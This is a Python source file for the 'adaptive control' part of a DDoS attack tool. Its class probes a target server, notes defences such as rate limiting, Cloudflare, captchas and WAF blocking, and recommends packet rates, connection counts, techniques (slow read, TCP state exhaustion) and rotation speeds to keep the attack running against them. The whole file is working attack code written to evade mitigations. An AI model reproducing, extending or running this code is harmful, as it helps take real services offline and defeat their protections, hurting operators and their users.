"""
Adaptive Control Module for Advanced DDoS Attacks

This module provides monitoring and adaptation capabilities
to dynamically adjust attack parameters based on target response.
"""

import time
import threading
import logging
import requests

# Get the centralized attack logger
attack_logger = logging.getLogger('attack_logger')


class AdaptiveController:
    """Monitors target and adapts attack parameters dynamically."""
    
    def __init__(self, target):
        """
        Initialize adaptive controller for a specific target.
        
        Args:
            target: Target server address
        """
        self.target = target
        self.response_times = []
        self.detected_countermeasures = set()
        self.lock = threading.Lock()
    
    def probe_target(self):
        """
        Send probe requests to measure target response and detect countermeasures.
        
        Returns:
            float: Response time in seconds, or None if failed
        """
        try:
            start_time = time.time()
            response = requests.get(f"http://{self.target}/", timeout=5)
            response_time = time.time() - start_time
            
            with self.lock:
                # Keep last 10 response times
                self.response_times.append(response_time)
                if len(self.response_times) > 10:
                    self.response_times.pop(0)
                
                # Check for countermeasures in headers or response
                if response.status_code == 503:
                    self.detected_countermeasures.add("rate_limiting")
                
                if "cf-ray" in response.headers:
                    self.detected_countermeasures.add("cloudflare")
                
                if "captcha" in response.text.lower():
                    self.detected_countermeasures.add("captcha")
                
                if response.status_code == 403:
                    self.detected_countermeasures.add("waf_blocking")
            
            return response_time
        except requests.exceptions.Timeout:
            with self.lock:
                self.detected_countermeasures.add("timeout_defense")
            return None
        except Exception as e:
            attack_logger.debug(f"Probe error: {e}")
            return None
    
    def get_average_response_time(self):
        """
        Get average response time from recent measurements.
        
        Returns:
            float: Average response time in seconds
        """
        with self.lock:
            if not self.response_times:
                return 1.0  # Default if no measurements
            return sum(self.response_times) / len(self.response_times)
    
    def get_recommended_attack_params(self):
        """
        Recommend attack parameters based on target behavior.
        
        Returns:
            dict: Recommended attack parameters
        """
        with self.lock:
            avg_response = self.get_average_response_time()
            countermeasures = list(self.detected_countermeasures)
        
        # Default parameters
        params = {
            "packet_rate": 10,
            "connection_count": 50,
            "preferred_technique": "slow_read",
            "rotation_speed": "medium"
        }
        
        # Adjust based on response time
        if avg_response < 0.2:  # Very fast target
            params["packet_rate"] = 20
            params["connection_count"] = 100
        elif avg_response > 2.0:  # Already struggling target
            params["packet_rate"] = 5
            params["connection_count"] = 20
        
        # Adjust based on detected countermeasures
        if "rate_limiting" in countermeasures:
            params["preferred_technique"] = "slow_read"
            params["rotation_speed"] = "fast"
        
        if "waf_blocking" in countermeasures:
            params["preferred_technique"] = "tcp_state_exhaustion"
        
        if "cloudflare" in countermeasures:
            params["rotation_speed"] = "very_fast"
        
        return params
    
    def monitoring_loop(self, duration=300):
        """
        Continuously monitor target and update parameters.
        
        Args:
            duration: Monitoring duration in seconds
        """
        attack_logger.info(f"Starting adaptive monitoring of {self.target} for {duration} seconds")
        
        end_time = time.time() + duration
        while time.time() < end_time:
            self.probe_target()
            
            # Log current status
            avg_time = self.get_average_response_time()
            countermeasures = list(self.detected_countermeasures)
            attack_logger.info(f"Target status: avg_response={avg_time:.2f}s, detected={countermeasures}")
            
            # Wait before next probe
            time.sleep(10)